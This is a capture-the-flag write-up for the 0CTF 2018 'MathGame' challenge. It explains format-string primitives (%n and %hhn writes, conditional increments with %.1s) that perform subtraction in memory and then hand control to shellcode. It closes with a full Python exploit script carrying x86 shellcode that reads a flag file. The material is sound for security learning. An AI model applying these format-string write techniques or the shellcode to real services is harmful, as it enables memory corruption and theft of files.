2018 0ctf quals – MathGame
==========================

This one looked like a little math challenge, based on the solver count I assumed it would be easy. Well, I was wrong.


Problem statement
-----------------

The binary provided had everything enabled (alsr, nx, etc...). Also had syscall filter to only read/write/open.

  * It allocates a fix buffer to a static address
  * Places two random ints at 0xDEAD1000 (A, B)
  * Reads stdin by 32 bytes in a loop
  * Copies the buffer after B
  * *And executes dprintf with that buffer (outputs to `/dev/null`), with varargs aligned to start at A*
  * If we send an empty (\0) buffer and the address Diff contains A-B, then it reads 95 bytes to an rwx buffer and jumps
    on it

Memory layout:

       address | 0xDEAD1000            |     |     | 0xDEAD1800
          name | A | B | format string |     | ... | Diff | ... |
    byte count | 4 | 4 |      32       |     |     |   4
     arg index | 3 | 4 | 5 ... 11 | 12 | 13  |     |         
      

Solution idea
-------------

Do the subtraction and send a shellcode. The `%n` conversion enables us to write memory, it writes the count of
characters emitted so far by this printf call to the location pointed by the argument.

### Getting the individual bytes of the numbers

Using `"%{0}$.*{0}$d".format(x)` we can output exactly as many bytes as the `x`-th argument. It writes
`'', '1', '02', '003'` and so on to /dev/null. Appending `%12&n` and putting an address as the last 4-byte in our
32 byte long buffer we can write this value anywhere as long as the number at x was non-negative
(arg[x]>0x7fffffff wont work). This will copy quite a few bytes to the void, takes a few seconds, but we have time don't
we.

So copy A and B to misaligned locations, and overwrite the bytes you currently dont care about. Writing bytes is easy,
just send `"%12$.{}d%11$hhn".format(val)` with the address and four zeroes as the last 8 bytes.

### Subtracting bytes

Adding bytes would be easy, just concatenate two of the copying strings:

    "%{0}$.*{0}$d%{1}$.*{1}$d%12$n".format(idx_a, idx_b)
    
Subtracting is a bit harder. How about incrementing two registers simultaneously one-by-one until one of them overflows?
That certainly makes it but we have no loops here. So we ended up searching for a primitive that increments a value
if a pointed byte is non-zero (call it `inc_if_byte`), and sending that over the wire 256 times.

    def sub_byte(idx_a, idx_b):
      addr_b = idx_to_addr(idx_b)
      inc_byte(idx_a)
      inc_byte(idx_b)
      for _ in range(255):
        inc_if_byte(idx_a, addr_b)
        inc_if_byte(idx_b, addr_b)

The first increment is not conditional, so at the end number `b` is guaranteed to be exactly 256, even if we started
with `b = 0`. How does the conditional increment work? We found multiple solutions, the shortest is taking advantage
of the `%s` conversion with a precision of 1. That means we output at most 1 character of a null-terminated string. So
if that first byte is zero, no bytes are outputted, if anything else, it is outputted as exactly one byte. Add the
original value of the variable and you have your conditional increment.

    def inc_if_byte(idx_orig, addr_test, addr_out=None):
      if addr_out is None:
          addr_out = idx_to_addr(idx_orig)
      send("%{0}$.*{0}$d%12$.1s%11$n".format(idx_orig), addr_out, addr_test)

These are all the primitives that you need. Compute the difference one byte at a time, copy the output bytes to the
output buffer, and handle carry (which happens to be an addition, easier to use 16-byte arithmetics there).

At the end we put a shellcode to read `/etc/passwd` to find a user called `subtraction`, the flag was in
`/home/subtraction/flag`.

Enjoy your flag: `flag{pr1n7f_15_600d_47_51mpl3_m47h}`

Commands without the shellcode at the end
-----------------------------------------

```python3
import sys
import struct
import time

index = 0
def _send(w = b""):
  sys.stdout.buffer.write(w)
  
def send(w = "", p1=0, p2=0):
  global index
  w = w.encode('ascii')
  assert len(w) < 24
  w = ((w + b"\0" * 24)[:24]) + p32(p1) + p32(p2)
  assert len(w) == 32
  _send(w)
  index += 1

def send1(w = "", p2=0):
  global index
  w = w.encode('ascii')
  assert len(w) < 28
  w = ((w + b"\0" * 28)[:28]) + p32(p2)
  assert len(w) == 32
  _send(w)
  index += 1

def send_end():
  _send(b"\0" * 32)

def p32(i):
  return struct.pack("<I", i)

def var32(i):
  return p32(0xDEAD1000 + 4 * i)

def tmp32(i):
  return p32(0xDEAD1000 + 4 * i)

def set_byte(addr, val):
  send("%12$.{}d%11$hhn".format(val), addr)

def set(addr, val):
  send("%12$.{}d%11$n".format(val), addr)
  
def test_byte(addr_in, addr_out):
  send("%11$.1s%12$n", addr_in, addr_out)

def inc_if_byte(idx_orig, addr_test, addr_out=None):
  if addr_out is None:
      addr_out = idx_to_addr(idx_orig)
  send(
    "%{0}$.*{0}$d%12$.1s%11$n".format(idx_orig),
    addr_out, addr_test)

def inc_byte(idx_orig, addr_out=None):
  if addr_out is None:
      addr_out = idx_to_addr(idx_orig)
  send(
    "%{0}$.*{0}$dA%11$n".format(idx_orig),
    addr_out)

def add_const(idx_orig, value, addr_out=None):
  if addr_out is None:
      addr_out = 0xDEAD1000 - 3*4 + idx_orig * 4
  send1(
    "%{0}$.*{0}$d%99$.{1}d%12$n".format(idx_orig, value),
    addr_out)

  
addr_A = 0xDEAD1000
addr_B = 0xDEAD1004
addr_O = 0xDEAD1800

idx_A = 3
idx_B = 4

def idx_to_addr(idx):
  return 0xDEAD1000 - 3*4 + idx * 4

#  A   3$  0xDEAD1000
#  B   4$  0xDEAD1004

# c0   5$  0xDEAD1008
# c1   6$  0xDEAD100c

# p1  11$  0xDEAD1020
# p2  12$  0xDEAD1024

# v0  13$  0xDEAD1028
# v1  14$  0xDEAD102c
# v2  15$  0xDEAD1030
# v3  16$  0xDEAD1034

def addr_v(i):
  return 0xDEAD1028 + 4 * i

def idx_v(i):
  return 13 + i

def mov_to_byte_ptr(idx_in, addr_out):
  send("%{0}$.*{0}$d%11$hhn".format(idx_in), addr_out)

def mov_to_ptr(idx_in, addr_out):
  send("%{0}$.*{0}$d%11$n".format(idx_in), addr_out)

def pluck_byte(idx_src, idx_dest, digit):
  addr_dest = idx_to_addr(idx_dest)
  mov_to_ptr(idx_src, addr_dest - digit)
  set_byte(addr_dest + 1, 0)
  set_byte(addr_dest + 2, 0)
  set_byte(addr_dest + 3, 0)

def sub_byte(idx_a, idx_b):
  addr_b = idx_to_addr(idx_b)
  inc_byte(idx_a)
  inc_byte(idx_b)
  for _ in range(255):
    inc_if_byte(idx_a, addr_b)
    inc_if_byte(idx_b, addr_b)

def add(idx_a, idx_b, addr_dest=None):
  if addr_dest is None:
    addr_dest = idx_to_addr(idx_a)
  send1("%{0}$.*{0}$d%{1}$.*{1}$d%12$n".format(
    idx_a, idx_b
  ), addr_dest)

def truncate_byte(idx):
  addr = idx_to_addr(idx)
  set_byte(addr + 1, 0)
  set_byte(addr + 2, 0)
  set_byte(addr + 3, 0)

def truncate_word(idx):
  addr = idx_to_addr(idx)
  set_byte(addr + 2, 0)
  set_byte(addr + 3, 0)

    
def process_byte(digit):
  pluck_byte(idx_A, idx_v(1), digit)
  pluck_byte(idx_B, idx_v(3), digit)

  sub_byte(idx_v(1), idx_v(3))
  add(idx_v(1), idx_v(5))

  mov_to_byte_ptr(idx_v(1), addr_O + digit)
  
  pluck_byte(idx_v(1), idx_v(5), 1) # carry
  add_const(idx_v(5), 65535)
  truncate_word(idx_v(5))

for i in range(4):
  process_byte(i)

send_end()

sys.stderr.write("Total commands sent: {}\n".format(index))

shellcode = b""
shellcode += b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
shellcode += b"\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"
shellcode += b"\x80\x89\xc6\xeb\x06\xb0\x01\x31"
shellcode += b"\xdb\xcd\x80\x89\xf3\xb0\x03\x83"
shellcode += b"\xec\x01\x8d\x0c\x24\xb2\x01\xcd"
shellcode += b"\x80\x31\xdb\x39\xc3\x74\xe6\xb0"
shellcode += b"\x04\xb3\x01\xb2\x01\xcd\x80\x83"
shellcode += b"\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"
shellcode += b"\xff"
shellcode += b"/home/subtraction/flag\x00"

sys.stdout.buffer.write(shellcode)
time.sleep(1)
```
